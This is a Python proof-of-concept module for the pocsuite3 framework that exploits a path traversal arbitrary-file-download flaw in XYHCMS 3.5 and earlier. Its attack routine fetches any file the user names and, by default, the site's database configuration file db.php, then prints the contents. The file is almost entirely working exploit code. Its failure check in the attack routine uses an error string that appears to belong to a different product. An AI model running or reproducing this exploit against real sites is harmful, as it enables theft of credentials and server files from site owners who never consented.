# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/5/16 11:00
# Product   : PyCharm
# Project   : pocsuite3
# File      : XYHCMS_3_5_download.py
# explain   : 文件说明
import re
import base64
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from urllib.parse import quote

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-05-16'
    createDate = '2021-05-16'
    updateDate = '2021-05-16'
    references = ['https://paper.seebug.org/705/']
    name = 'XYHCMS V3.5任意文件下载漏洞'
    appPowerLink = ''
    appName = 'XYHCMS'
    appVersion = '<= 3.5'
    vulType = VUL_TYPE.ARBITRARY_FILE_DOWNLOAD
    desc = '''
        XYHCMS V3.5任意文件下载漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString('', description='下载文件名称', require=False)
        o["PHPSESSID"] = OptString('', description='这个poc需要PHPSESSID', require=True)
        return o

    def _verify(self):
        result = {}
        try:
            Flag_error = "该文件不存在"
            verify_payload = '/xyhai.php?s=/Database/downFile/file/..\\..\\..\\xyhai.php/type/zip'
            verify_url = self.url + verify_payload
            logger.info(verify_url)
            cookies = {
                'PHPSESSID': self.get_option("PHPSESSID")
            }
            verify_res = requests.get(verify_url,cookies=cookies,verify=False)
            if verify_res.status_code ==200 and Flag_error not in verify_res.content.decode():
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = verify_url
                result['VerifyInfo']['Payload'] = verify_payload
                result['VerifyInfo']['File_Content'] = '\n'+ verify_res.content.decode()
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        try:
            Flag_error = "This file does not exist in JobManager log dir"
            if self.get_option("filename"):
                attack_filename = self.get_option("filename").replace('/','\\\\')
            else:
                attack_filename = 'App\\Common\\Conf\\db.php'
            logger.info("下载文件为：" + attack_filename)
            attack_payload = '/xyhai.php?s=/Database/downFile/file/..\\..\\..\\' + attack_filename + '/type/zip'
            attack_url = self.url + attack_payload
            logger.info(attack_url)
            cookies = {
                'PHPSESSID': self.get_option("PHPSESSID")
            }
            attack_res = requests.get(attack_url,cookies=cookies,verify=False)
            if attack_res.status_code ==200 and Flag_error not in attack_res.content.decode():
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = attack_url
                result['VerifyInfo']['Payload'] = attack_payload
                result['VerifyInfo']['File_Content'] = '\n' + attack_res.content.decode()
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _shell(self):
        return self._attack()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)